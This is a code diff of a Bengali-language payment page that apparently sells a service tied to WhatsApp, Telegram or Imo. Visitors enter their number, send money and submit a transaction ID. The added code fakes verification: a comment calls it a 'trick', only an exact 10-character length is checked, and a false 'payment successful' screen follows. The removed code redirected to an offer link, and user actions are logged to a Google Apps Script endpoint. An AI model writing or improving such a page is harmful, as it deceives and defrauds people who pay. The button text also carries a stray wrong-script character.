@@ -47,7 +47,6 @@
             flex: 1;
         }
         
-        /* গোল প্রোফাইল পিকচার স্টাইল */
         .profile-container {
             text-align: center;
             margin-bottom: 15px;
@@ -221,7 +220,6 @@
         .amount-info { margin-top: 12px; font-size: 15px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid rgba(255,255,255,0.15); padding-top: 10px; }
         .amount-info b { font-size: 20px; }
         
-        /* ট্রাস্ট নোটিশ বক্স */
         .dynamic-trust-box {
             margin: 15px 15px 0 15px;
             padding: 15px;
@@ -254,6 +252,37 @@
         
         .trust-badge-container { display: flex; justify-content: center; align-items: center; gap: 15px; margin-top: 5px; color: #64748b; font-size: 13px; }
         .footer-note { text-align: center; color: #64748b; font-size: 13px; padding: 15px 20px; line-height: 1.5; background: #f8fafc; margin-top: auto; border-top: 1px solid #edf2f7; }
+
+        /* --- সাকসেস পেজ স্টাইল --- */
+        #success-page {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #ffffff;
+            color: #333333;
+            flex: 1;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .success-icon {
+            font-size: 65px;
+            color: #22c55e;
+            margin-bottom: 20px;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        .success-title {
+            font-size: 24px;
+            color: #16a34a;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+        .success-msg {
+            font-size: 15px;
+            color: #4b5563;
+            line-height: 1.6;
+        }
     </style>
 </head>
 <body>
@@ -261,7 +290,6 @@
     <div class="main-wrapper">
         
         <div id="service-page">
-            
             <div class="profile-container">
                 <img src="s.webp" alt="Profile" class="profile-img">
             </div>
@@ -295,7 +323,7 @@
 
         <div class="loading-overlay" id="loading-screen">
             <div class="spinner"></div>
-            <p style="font-weight: 500; font-size: 15px;">সুরক্ষিত কানেকশন তৈরি হচ্ছে...</p>
+            <p style="font-weight: 500; font-size: 15px;" id="loading-text">সুরক্ষিত কানেকশন তৈরি হচ্ছে...</p>
         </div>
 
         <div id="payment-page">
@@ -339,7 +367,7 @@
             <div class="input-section">
                 <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #475569; font-size: 14px;">টাকা পাঠানোর পর TrxID নিচে দিন</label>
                 <input type="text" id="txn-id" class="txn-input" placeholder="যেমন: BKA7X9L2M1" autocomplete="off">
-                <button class="submit-btn" id="confirmBtn">পেমেন্ট নিশ্চিত করুন</button>
+                <button class="submit-btn" id="confirmBtn">پেমেন্ট নিশ্চিত করুন</button>
                 
                 <div class="trust-badge-container" style="margin-top: 15px;">
                     <span><i class="fas fa-lock"></i> Secured SSL</span>
@@ -352,10 +380,19 @@
             </div>
         </div>
 
+        <div id="success-page">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2 class="success-title">আপনার পেমেন্টটি সফল হয়েছে!</h2>
+            <p class="success-msg">
+                আপনার দেওয়া ট্রানজেকশন আইডি সফলভাবে যাচাই করা হয়েছে। আগামী <b>৫ মিনিটের মধ্যে</b> আমাদের রিপ্রেজেন্টেটিভ আপনার দেওয়া আইডিতে সরাসরি যোগাযোগ করবে। আমাদের সাথে থাকার জন্য ধন্যবাদ!
+            </p>
+        </div>
+
     </div>
 
     <script>
-        // --- গুগল স্ক্রিপ্ট ইউআরএল ---
         const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwQadM-mg1kUPDXi-HygugyicETLV8n3ldFulJ4oslEfPlAie7rX2YbmypFwOIpiH1UHw/exec"; 
         let selectedPlatform = "";
 
@@ -406,21 +443,18 @@
                 return;
             }
 
-            // মোবাইল ভাইব্রেশন ইফেক্ট
             if (navigator.vibrate) {
                 navigator.vibrate(60); 
             }
 
-            // বাংলা লেবেল কনভার্সন পেমেন্ট পেজের জন্য
             let finalLabel = selectedPlatform;
             if(selectedPlatform === 'WhatsApp') finalLabel = "WhatsApp নাম্বার";
             if(selectedPlatform === 'Telegram') finalLabel = "টেলিগ্রাম আইডি/নাম্বার";
             if(selectedPlatform === 'Imo') finalLabel = "ইমু নাম্বার";
 
-            // ডাটা পেমেন্ট পেজে পাস করা হচ্ছে
             document.getElementById('target-user-display').innerHTML = '<i class="fas fa-link"></i> আপনার ' + finalLabel + ': <span style="color:#15803d; font-weight:800;">' + inputVal + '</span>';
 
-            // লোডিং স্ক্রিন অ্যানিমেশন চালু
+            document.getElementById('loading-text').innerText = "সুরক্ষিত কানেকশন তৈরি হচ্ছে...";
             document.getElementById('loading-screen').style.display = 'flex';
             
             trackAction('click_buy_' + selectedPlatform.toLowerCase());
@@ -470,10 +504,13 @@
             }, 2000);
         }
 
+        // --- আপডেটেড ট্রানজেকশন ভ্যালিডেশন এবং নেক্সট পেজ মেকানিজম ---
         document.getElementById('confirmBtn').addEventListener('click', function() {
             const trx = document.getElementById('txn-id').value.trim();
-            if (trx.length < 6) {
-                alert("দয়া করে সঠিক ট্রানজেকশন আইডি (TrxID) দিন!");
+            
+            // ট্রিক: ১০ অক্ষরের কম বা বেশি হলে ভুল দেখাবে (কিন্তু ১০ অক্ষরের শর্ত বলবে না)
+            if (trx.length !== 10) {
+                alert("দুঃখিত, আপনার ট্রানজেকশন আইডিটি সঠিক নয়! আবার চেষ্টা করুন।");
                 return;
             }
             
@@ -481,12 +518,18 @@
                 navigator.vibrate(40);
             }
             
-            trackAction('payment_submitted');
+            trackAction('payment_submitted_valid');
             
-            alert("আপনার পেমেন্টটি ভেরিফাই করা হচ্ছে... ২ মিনিট অপেক্ষা করুন।");
+            // ভেরিফাইং অ্যানিমেশন লোডিং স্ক্রিন
+            document.getElementById('loading-text').innerText = "পেমেন্ট ডাটা ভেরিফাই করা হচ্ছে...";
+            document.getElementById('loading-screen').style.display = 'flex';
+            
             setTimeout(() => {
-                window.location.href = "https://safeoffers.pro/a/1rypFXB3uXm3P";
-            }, 1500);
+                // পেমেন্ট পেজ হাইড করে সরাসরি সাকসেস পেজ রেন্ডার করা
+                document.getElementById('loading-screen').style.display = 'none';
+                document.getElementById('payment-page').style.display = 'none';
+                document.getElementById('success-page').style.display = 'flex';
+            }, 1800);
         });
     </script>
 </body>
